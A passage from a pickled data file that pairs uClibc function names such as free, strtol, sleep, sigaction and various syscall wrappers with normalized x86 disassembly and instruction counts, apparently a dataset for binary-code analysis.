DD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p317
L424L
tp318
a(S'free'
p319
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EDI,[ESP+0]\nTEST~EDI,EDI\nJZ~FOO\nPUSH~ESI\nPUSH~0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nLEA~ECX,[EDI-0]\nMOV~EAX,<STR>\nADD~ESP,0\nMOV~EDX,[ECX+0]\nMOV~EBX,EDX\nAND~EBX,0\nCMP~EBX,EAX\nJA~FOO\nSHR~EBX,0\nOR~EAX,0\nMOV~<STR>,EAX\nLEA~EDX,<STR>\nMOV~EAX,[EDX-0]\nMOV~[ECX+0],EAX\nMOV~[EDX-0],ECX\nJMP~FOO\nAND~DL,0\nJNZ~FOO\nOR~EAX,0\nLEA~ESI,[ECX+EBX]\nMOV~<STR>,EAX\nMOV~EAX,[ESI+0]\nMOV~[ESP+0],EAX\nTEST~[ECX+0],0\nJNZ~FOO\nMOV~EBP,[EDI-0]\nMOV~EAX,ECX\nSUB~EAX,EBP\nMOV~EDI,[EAX+0]\nMOV~EDX,[EAX+0]\nMOV~ECX,[EDI+0]\nCMP~ECX,EAX\nJNZ~FOO\nCMP~[EDX+0],ECX\nJNZ~FOO\nADD~EBX,EBP\nMOV~[EDI+0],EDX\nMOV~[EDX+0],EDI\nMOV~EBP,[ESP+0]\nAND~EBP,0\nCMP~ESI,<STR>\nJZ~FOO\nMOV~EAX,[ESI+EBP+0]\nMOV~[ESI+0],EBP\nAND~EAX,0\nTEST~EAX,EAX\nJNZ~FOO\nMOV~EDX,[ESI+0]\nMOV~EAX,[ESI+0]\nMOV~EDI,[EDX+0]\nCMP~EDI,ESI\nJNZ~FOO\nCMP~[EAX+0],EDI\nJZ~FOO\nCALL~FOO\nMOV~[EDX+0],EAX\nMOV~[EAX+0],EDX\nADD~EBX,EBP\nMOV~EAX,<STR>\nMOV~[ECX+0],0\nMOV~[ECX+0],EAX\nMOV~[ECX+EBX],EBX\nMOV~[EAX+0],ECX\nMOV~EAX,EBX\nOR~EAX,0\nMOV~<STR>,ECX\nMOV~[ECX+0],EAX\nJMP~FOO\nADD~EBX,EBP\nMOV~EAX,EBX\nOR~EAX,0\nMOV~[ECX+0],EAX\nMOV~<STR>,ECX\nCMP~EBX,0\nJBE~FOO\nTEST~<STR>,0\nJZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~EAX,<STR>\nMOV~EAX,[EAX+0]\nAND~EAX,0\nCMP~EAX,<STR>\nJB~FOO\nMOV~EDX,0\nMOV~EAX,<STR>\nCALL~FOO\nJMP~FOO\nMOV~EDX,[EDI-0]\nDEC~<STR>\nLEA~EAX,[EBX+EDX]\nSUB~ECX,EDX\nPUSH~EBX\nPUSH~EBX\nPUSH~EAX\nPUSH~ECX\nSUB~<STR>,EAX\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p320
L412L
tp321
a(S'abort'
p322
S'"PUSH~EBX\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~EAX,0\nADD~ESP,0\nJMP~FOO\nMOV~[ESP+EAX*4+0],0\nDEC~EAX\nJNS~FOO\nPUSH~EBX\nPUSH~EBX\nPUSH~0\nLEA~EBX,[ESP+0]\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJNZ~FOO\nPUSH~ECX\nPUSH~0\nPUSH~EBX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nCMP~<STR>,0\nJNZ~FOO\nMOV~<STR>,0\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nMOV~AL,<STR>\nCMP~AL,0\nJNZ~FOO\nPUSH~EDX\nPUSH~0\nPUSH~0\nMOV~<STR>,0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~[ESP+0],0\nMOV~EAX,0\nADD~ESP,0\nJMP~FOO\nMOV~[ESP+EAX*4+0],0\nDEC~EAX\nJNS~FOO\nMOV~[ESP+0],0\nPUSH~EAX\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nCMP~AL,0\nJNZ~FOO\nMOV~<STR>,0\nHLT\nCMP~<STR>,0\nJNZ~FOO\nSUB~ESP,0\nMOV~<STR>,0\nPUSH~0\nCALL~FOO\nHLT"'
p323
L271L
tp324
a(S'atol'
p325
S'"SUB~ESP,0\nPUSH~0\nPUSH~0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nRETN"'
p326
L20L
tp327
a(S'strtol'
p328
S'"SUB~ESP,0\nPUSH~0\nPUSH~[ESP+0]\nPUSH~[ESP+0]\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nRETN"'
p329
L26L
tp330
a(S'_stdlib_strto_l'
p331
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EDX,<STR>\nMOV~ECX,[ESP+0]\nMOV~ESI,[ESP+0]\nMOV~EBX,ECX\nJMP~FOO\nINC~EBX\nMOVSX~EAX,BYTEPTR[EBX]\nTEST~BYTEPTR[EDX+EAX*2],0\nJNZ~FOO\nCMP~EAX,0\nJZ~FOO\nXOR~EBP,EBP\nCMP~EAX,0\nJNZ~FOO\nMOV~EBP,0\nJMP~FOO\nXOR~EBP,EBP\nINC~EBX\nMOV~EDI,ECX\nTEST~ESI,0\nJNZ~FOO\nADD~ESI,0\nCMP~BYTEPTR[EBX],0\nJNZ~FOO\nINC~EBX\nSUB~ESI,0\nMOV~EDI,EBX\nMOV~AL,[EBX]\nOR~EAX,0\nCMP~AL,0\nJNZ~FOO\nADD~ESI,ESI\nINC~EBX\nCMP~ESI,0\nJLE~FOO\nMOV~ESI,0\nLEA~EAX,[ESI-0]\nXOR~EDX,EDX\nCMP~EAX,0\nJA~FOO\nOR~EAX,0\nXOR~EDX,EDX\nDIV~,ESI\nMOV~[ESP+0],DL\nXOR~EDX,EDX\nMOV~[ESP+0],EAX\nJMP~FOO\nMOV~EDI,EBX\nMOV~AL,[EBX]\nLEA~ECX,[EAX-0]\nCMP~CL,0\nJBE~FOO\nOR~EAX,0\nMOV~CL,0\nCMP~AL,0\nJBE~FOO\nLEA~ECX,[EAX-0]\nMOVZX~EAX,CL\nCMP~EAX,ESI\nJGE~FOO\nINC~EBX\nCMP~EDX,[ESP+0]\nJA~FOO\nJNZ~FOO\nCMP~CL,[ESP+0]\nJBE~FOO\nMOV~AL,[ESP+0]\nAND~EBP,EAX\nCALL~FOO\nOR~EDX,0\nMOV~DWORDPTR[EAX],0\nJMP~FOO\nIMUL~EDX,ESI\nMOVZX~EAX,CL\nADD~EDX,EAX\nJMP~FOO\nCMP~[ESP+0],0\nJZ~FOO\nMOV~EAX,[ESP+0]\nMOV~[EAX],EDI\nMOV~EAX,EBP\nCMP~AL,0\nSBB~EBX,EBX\nSUB~EBX,0\nCMP~[ESP+0],0\nJZ~FOO\nCMP~EDX,EBX\nJBE~FOO\nCALL~FOO\nMOV~EDX,EBX\nMOV~DWORDPTR[EAX],0\nMOV~EAX,EBP\nTEST~AL,AL\nJZ~FOO\nNEG~EDX\nADD~ESP,0\nMOV~EAX,EDX\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p332
L277L
tp333
a(S'exit'
p334
S'"PUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~ESI,[ESP+0]\nPUSH~0\nPUSH~0\nLEA~EBX,[ESP+0]\nPUSH~EBX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~EAX,<STR>\nADD~ESP,0\nTEST~EAX,EAX\nJZ~FOO\nSUB~ESP,0\nPUSH~ESI\nCALL~EAX\nADD~ESP,0\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~EBX\nCALL~FOO\nCALL~FOO\nMOV~EAX,0\nADD~ESP,0\nTEST~EAX,EAX\nJZ~FOO\nCALL~FOO\nSUB~ESP,0\nPUSH~ESI\nCALL~FOO"'
p335
L103L
tp336
a(S'sleep'
p337
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EAX,0\nMOV~EDX,[ESP+0]\nTEST~EDX,EDX\nJNZ~FOO\nJMP~FOO\nMOV~[ESP+EAX*4+0],0\nDEC~EAX\nJNS~FOO\nMOV~[ESP+0],0\nMOV~[ESP+0],EDX\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nLEA~EBX,[ESP+0]\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJS~FOO\nPUSH~EAX\nLEA~ESI,[ESP+0]\nPUSH~ESI\nPUSH~EBX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJNZ~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nMOV~EDX,0\nTEST~EAX,EAX\nJZ~FOO\nJMP~FOO\nMOV~[ESP+EDX*4+0],0\nDEC~EDX\nJNS~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJS~FOO\nPUSH~EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJNS~FOO\nCALL~FOO\nMOV~EBX,EAX\nMOV~ESI,[EAX]\nPUSH~EBP\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nOR~EAX,0\nADD~ESP,0\nMOV~[EBX],ESI\nJMP~FOO\nCMP~[ESP+0],0\nLEA~EBP,[ESP+0]\nLEA~EBX,[ESP+0]\nJNZ~FOO\nPUSH~EDI\nPUSH~EDI\nPUSH~EBX\nPUSH~EBX\nCALL~FOO\nMOV~EDI,EAX\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nMOV~ESI,[EAX]\nPUSH~0\nPUSH~EBP\nPUSH~0\nCALL~FOO\nMOV~[EBX],ESI\nJMP~FOO\nPUSH~ESI\nPUSH~0\nPUSH~EBP\nPUSH~0\nCALL~FOO\nPOP~EDX\nPOP~ECX\nPUSH~EBX\nPUSH~EBX\nJMP~FOO\nPUSH~EAX\nPUSH~EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~EAX\nCALL~FOO\nMOV~EDI,EAX\nADD~ESP,0\nTEST~EDI,EDI\nJZ~FOO\nXOR~EAX,EAX\nCMP~[ESP+0],0\nSETNLE~AL\nADD~EAX,[ESP+0]\nJMP~FOO\nXOR~EAX,EAX\nJMP~FOO\nOR~EAX,0\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p338
L393L
tp339
a(S'sysconf'
p340
S'"SUB~ESP,0\nMOV~EAX,[ESP+0]\nCMP~EAX,0\nJA~FOO\nJMP~<STR>\nMOV~EAX,0\nJMP~FOO\nCALL~FOO\nMOV~DWORDPTR[EAX],0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nADD~ESP,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nADD~ESP,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJNS~FOO\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nOR~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nADD~ESP,0\nRETN"'
p341
L325L
tp342
a(S'__uClibc_fini'
p343
S'"PUSH~EBX\nMOV~EBX,0\nSUB~EBX,0\nSUB~ESP,0\nSAR~EBX,0\nJMP~FOO\nCALL~<STR>\nDEC~EBX\nCMP~EBX,0\nJNZ~FOO\nMOV~EAX,<STR>\nTEST~EAX,EAX\nJZ~FOO\nCALL~EAX\nMOV~ECX,<STR>\nTEST~ECX,ECX\nJZ~FOO\nPOP~EBX\nPOP~EAX\nPOP~EBX\nJMP~ECX\nPOP~EAX\nPOP~EDX\nPOP~EBX\nRETN"'
p344
L63L
tp345
a(S'__check_one_fd'
p346
S'"PUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~ESI,EAX\nMOV~EBX,EDX\nPUSH~0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJNZ~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~EBX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nCMP~EAX,ESI\nJZ~FOO\nCALL~FOO\nPOP~EAX\nPOP~EBX\nPOP~ESI\nRETN"'
p347
L52L
tp348
a(S'__uClibc_init'
p349
S'"SUB~ESP,0\nCMP~<STR>,0\nJNZ~FOO\nMOV~EAX,0\nMOV~<STR>,0\nMOV~<STR>,0\nTEST~EAX,EAX\nJZ~FOO\nCALL~FOO\nMOV~EAX,0\nTEST~EAX,EAX\nJZ~FOO\nADD~ESP,0\nJMP~FOO\nADD~ESP,0\nRETN"'
p350
L64L
tp351
a(S'__uClibc_main'
p352
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EAX,[ESP+0]\nMOV~EDI,[ESP+0]\nMOV~<STR>,EAX\nMOV~EAX,[ESP+0]\nMOV~<STR>,EAX\nMOV~EAX,[ESP+0]\nMOV~EBP,[ESP+0]\nLEA~EDX,[EDI+EAX*4]\nLEA~EAX,[EDX+0]\nMOV~<STR>,EAX\nCMP~EAX,[EDI]\nJNZ~FOO\nMOV~<STR>,EDX\nPUSH~ECX\nPUSH~0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~EAX,<STR>\nADD~ESP,0\nCMP~DWORDPTR[EAX],0\nLEA~EAX,[EAX+0]\nJNZ~FOO\nMOV~EBX,EAX\nJMP~FOO\nMOV~EAX,[EBX]\nCMP~EAX,0\nJA~FOO\nPUSH~EDX\nPUSH~0\nPUSH~EBX\nLEA~EAX,[ESP+EAX*8+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nADD~EBX,0\nCMP~DWORDPTR[EBX],0\nJNZ~FOO\nLEA~EAX,[ESP+0]\nCALL~FOO\nCALL~FOO\nMOV~EAX,[ESP+0]\nTEST~EAX,EAX\nJNZ~FOO\nMOV~AX,0\nMOV~<STR>,EAX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~EBX,EAX\nCALL~FOO\nCMP~EBX,EAX\nJNZ~FOO\nCALL~FOO\nMOV~EBX,EAX\nCALL~FOO\nCMP~EBX,EAX\nJNZ~FOO\nMOV~EAX,[ESP+0]\nCMP~EAX,0\nJZ~FOO\nCMP~EAX,[ESP+0]\nJNZ~FOO\nMOV~EAX,[ESP+0]\nCMP~EAX,[ESP+0]\nJZ~FOO\nMOV~EDX,0\nXOR~EAX,EAX\nCALL~FOO\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ESI,0\nMOV~EAX,[EDI]\nSUB~ESI,0\nMOV~<STR>,EAX\nSAR~ESI,0\nMOV~EAX,[ESP+0]\nXOR~EBX,EBX\nMOV~<STR>,EAX\nJMP~FOO\nCALL~<STR>\nINC~EBX\nCMP~EBX,ESI\nJB~FOO\nTEST~EBP,EBP\nJZ~FOO\nCALL~EBP\nMOV~ESI,0\nXOR~EBX,EBX\nSUB~ESI,0\nSAR~ESI,0\nJMP~FOO\nCALL~<STR>\nINC~EBX\nCMP~EBX,ESI\nJB~FOO\nMOV~EAX,0\nTEST~EAX,EAX\nJZ~FOO\nCALL~FOO\nMOV~DWORDPTR[EAX],0\nMOV~EAX,0\nTEST~EAX,EAX\nJZ~FOO\nCALL~FOO\nMOV~DWORDPTR[EAX],0\nPUSH~EAX\nPUSH~<STR>\nPUSH~EDI\nPUSH~[ESP+0]\nCALL~[ESP+0]\nMOV~[ESP],EAX\nCALL~FOO"'
p353
L441L
tp354
a(S'sigaction'
p355
S'"PUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EBX,[ESP+0]\nMOV~ESI,[ESP+0]\nTEST~EBX,EBX\nJZ~FOO\nMOV~EAX,[EBX]\nMOV~[ESP+0],EAX\nLEA~EAX,[EBX+0]\nPUSH~EDX\nPUSH~0\nPUSH~EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~EAX,[EBX+0]\nOR~EAX,0\nMOV~[ESP+0],EAX\nADD~ESP,0\nMOV~EAX,0\nTEST~[EBX+0],0\nJNZ~FOO\nMOV~EAX,0\nMOV~[ESP+0],EAX\nXOR~EDX,EDX\nTEST~ESI,ESI\nJZ~FOO\nLEA~EDX,[ESP+0]\nXOR~EAX,EAX\nTEST~EBX,EBX\nJZ~FOO\nLEA~EAX,[ESP+0]\nPUSH~0\nPUSH~EDX\nPUSH~EAX\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nTEST~ESI,ESI\nJZ~FOO\nTEST~EAX,EAX\nJS~FOO\nMOV~EAX,[ESP+0]\nMOV~[ESI],EAX\nPUSH~EAX\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nLEA~EAX,[ESI+0]\nPUSH~EAX\nCALL~FOO\nMOV~EAX,[ESP+0]\nMOV~[ESI+0],EAX\nMOV~EAX,[ESP+0]\nADD~ESP,0\nMOV~[ESI+0],EAX\nMOV~EAX,EBX\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nRETN"'
p356
L217L
tp357
a(S'mmap'
p358
S'"MOV~EDX,EBX\nMOV~EAX,0\nLEA~EBX,[ESP+0]\nINT~0\nMOV~EBX,EDX\nCMP~EAX,0\nJA~FOO\nRETN"'
p359
L27L
tp360
a(S'__socketcall'
p361
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EDX,[ESP+0]\nMOV~ECX,[ESP+0]\nXCHG~EDX,EBX\nMOV~EAX,0\nINT~0\nXCHG~EDX,EBX\nMOV~EBX,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EBX\nMOV~[EAX],EBX\nOR~EBX,0\nMOV~EAX,EBX\nPOP~EDX\nPOP~ECX\nPOP~EBX\nRETN"'
p362
L50L
tp363
a(S'__syscall_rt_sigaction'
p364
S'"PUSH~EDI\nPUSH~ESI\nSUB~ESP,0\nMOV~EDI,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~EDX,[ESP+0]\nMOV~ESI,[ESP+0]\nPUSH~EBX\nMOV~EBX,EDI\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~ESI,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~ESI\nMOV~[EAX],ESI\nOR~ESI,0\nMOV~EAX,ESI\nPOP~EDX\nPOP~ESI\nPOP~EDI\nRETN"'
p365
L59L
tp366
a(S'_exit'
p367
S'"PUSH~EDI\nPUSH~EBX\nSUB~ESP,0\nMOV~EDI,[ESP+0]\nPUSH~EBX\nMOV~EBX,EDI\nMOV~EAX,0\nINT~0"'
p368
L19L
tp369
a(S'clock_getres'
p370
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EDX,[ESP+0]\nMOV~ECX,[ESP+0]\nXCHG~EDX,EBX\nMOV~EAX,0\nINT~0\nXCHG~EDX,EBX\nMOV~EBX,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EBX\nMOV~[EAX],EBX\nOR~EBX,0\nMOV~EAX,EBX\nPOP~EDX\nPOP~ECX\nPOP~EBX\nRETN"'
p371
L50L
tp372
a(S'fstat'
p373
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EDX,[ESP+0]\nLEA~ECX,[ESP+0]\nXCHG~EDX,EBX\nMOV~EAX,0\nINT~0\nXCHG~EDX,EBX\nMOV~EBX,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EBX\nMOV~[EAX],EBX\nOR~EBX,0\nJMP~FOO\nTEST~EAX,EAX\nJNZ~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~[ESP+0]\nPUSH~ECX\nCALL~FOO\nADD~ESP,0\nMOV~EAX,EBX\nADD~ESP,0\nPOP~EBX\nRETN"'
p374
L72L
tp375
a(S'__getdents'
p376
S'"PUSH~EDI\nPUSH~ESI\nPUSH~EBX\nMOV~EBX,[ESP+0]\nPUSH~EDX\nPUSH~[ESP+0]\nPUSH~EBX\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nMOV~ESI,EAX\nTEST~EAX,EAX\nJLE~FOO\nLEA~EDI,[EBX+EAX]\nJMP~FOO\nMOV~EAX,[EBX+0]\nMOV~[EBX+0],EAX\nMOV~EAX,[EBX+0]\nMOV~[EBX+0],AX\nMOV~AL,[EBX+0]\nMOV~[EBX+0],AL\nPUSH~EAX\nMOVZX~EAX,[EBX+0]\nSUB~EAX,0\nPUSH~EAX\nLEA~EAX,[EBX+0]\nPUSH~EAX\nLEA~EAX,[EBX+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOVZX~EAX,[EBX+0]\nPUSH~EAX\nPUSH~EBX\nPUSH~EBX\nCALL~FOO\nMOVZX~EAX,[EBX+0]\nADD~ESP,0\nADD~EBX,EAX\nCMP~EBX,EDI\nJB~FOO\nMOV~EAX,ESI\nPOP~EBX\nPOP~ESI\nPOP~EDI\nRETN"'
p377
L111L
tp378
a(S'__getdents64'
p379
S'"PUSH~EBP\nMOV~EBP,ESP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EAX,[EBP+0]\nMOV~EDI,[EBP+0]\nADD~EAX,0\nMOV~EDX,[EBP+0]\nAND~EAX,0\nSUB~ESP,EAX\nLEA~EAX,[ESP+0]\nAND~EAX,0\nMOV~[EBP-0],EAX\nMOV~ECX,EAX\nPUSH~EBX\nMOV~EBX,EDI\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~[EBP-0],EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~[EBP-0]\nMOV~EDX,[EBP-0]\nMOV~[EAX],EDX\nJMP~FOO\nCMP~[EBP-0],0\nJZ~FOO\nMOV~ESI,[EBP+0]\nMOV~EBX,[EBP-0]\nMOV~[EBP-0],0\nMOV~[EBP-0],0\nJMP~FOO\nMOVZX~EAX,[EBX+0]\nLEA~ECX,[EAX+0]\nMOV~EAX,[EBP+0]\nAND~ECX,0\nADD~EAX,[EBP+0]\nLEA~EDI,[ESI+ECX]\nMOV~[EBP-0],EDI\nCMP~EDI,EAX\nJBE~FOO\nPUSH~0\nPUSH~[EBP-0]\nPUSH~[EBP-0]\nPUSH~[EBP+0]\nCALL~FOO\nADD~ESP,0\nCMP~ESI,[EBP+0]\nJNZ~FOO\nCALL~FOO\nMOV~DWORDPTR[EAX],0\nOR~EAX,0\nJMP~FOO\nMOV~EAX,[EBX+0]\nMOV~EDX,[EBX+0]\nMOV~[EBP-0],EDX\nMOV~[EBP-0],EAX\nMOV~EAX,[EBX]\nMOV~EDX,[EBX+0]\nMOV~[ESI+0],EDX\nMOV~[ESI],EAX\nMOV~EAX,[EBX+0]\nMOV~EDX,[EBX+0]\nMOV~[ESI+0],EDX\nMOV~[ESI+0],EAX\nMOV~[ESI+0],CX\nMOV~AL,[EBX+0]\nMOV~[ESI+0],AL\nPUSH~EAX\nMOVZX~EAX,[EBX+0]\nSUB~EAX,0\nPUSH~EAX\nLEA~EAX,[EBX+0]\nPUSH~EAX\nLEA~EAX,[ESI+0]\nPUSH~EAX\nCALL~FOO\nMOVZX~EAX,[EBX+0]\nMOV~ESI,[EBP-0]\nADD~EBX,EAX\nADD~ESP,0\nMOV~EAX,[EBP-0]\nADD~EAX,[EBP-0]\nCMP~EBX,EAX\nJB~FOO\nMOV~EAX,ESI\nSUB~EAX,[EBP+0]\nLEA~ESP,[EBP-0]\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p380
L276L
tp381
a(S'getdtablesize'
p382
S'"SUB~ESP,0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~EDX,0\nTEST~EAX,EAX\nJS~FOO\nMOV~EDX,[ESP+0]\nMOV~EAX,EDX\nADD~ESP,0\nRETN"'
p383
L37L
tp384
a(S'getegid'
p385
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EAX,0\nINT~0\nMOV~EBX,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EBX\nMOV~[EAX],EBX\nOR~EBX,0\nMOV~EAX,EBX\nPOP~EDX\nPOP~ECX\nPOP~EBX\nRETN"'
p386
L38L
tp387
a(S'geteuid'
p388
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EAX,0\nINT~0\nMOV~EBX,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EBX\nMOV~[EAX],EBX\nOR~EBX,0\nMOV~EAX,EBX\nPOP~EDX\nPOP~ECX\nPOP~EBX\nRETN"'
p389
L38L
tp390
a(S'getgid'
p391
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EAX,0\nINT~0\nMOV~EBX,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EBX\nMOV~[EAX],EBX\nOR~EBX,0\nMOV~EAX,EBX\nPOP~EDX\nPOP~ECX\nPOP~EBX\nRETN"'
p392
L38L
tp393
a(S'getpagesize'
p394
S'"MOV~EAX,<STR>\nMOV~EDX,0\nTEST~EAX,EAX\nJZ~FOO\nMOV~EDX,EAX\nMOV~EAX,EDX\nRETN"'
p395
L19L
tp396
a(S'getrlimit'
p397
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EDX,[ESP+0]\nMOV~ECX,[ESP+0]\nXCHG~EDX,EBX\nMOV~EAX,0\nINT~0\nXCHG~EDX,EBX\nMOV~EBX,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EBX\nMOV~[EAX],EBX\nOR~EBX,0\nMOV~EAX,EBX\nPOP~EDX\nPOP~ECX\nPOP~EBX\nRETN"'
p398
L50L
tp399
a(S'getuid'
p400
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EAX,0\nINT~0\nMOV~EBX,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EBX\nMOV~[EAX],EBX\nOR~EBX,0\nMOV~EAX,EBX\nPOP~EDX\nPOP~ECX\nPOP~EBX\nRETN"'
p401
L38L
tp402
a(S'lseek64'
p403
S'"PUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EBX,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~ECX,EBX\nMOV~EDI,[ESP+0]\nMOV~EBX,ECX\nLEA~ESI,[ESP+0]\nSAR~EBX,0\nMOV~EAX,[ESP+0]\nMOV~EDX,[ESP+0]\nPUSH~EBX\nMOV~EBX,EAX\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~ESI,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~ESI\nMOV~[EAX],ESI\nOR~ESI,0\nJMP~FOO\nTEST~EAX,EAX\nJZ~FOO\nMOV~EAX,ESI\nCDQ~,\nJMP~FOO\nMOV~EAX,[ESP+0]\nMOV~EDX,[ESP+0]\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nRETN"'
p404
L95L
tp405
a(S'mremap'
p406
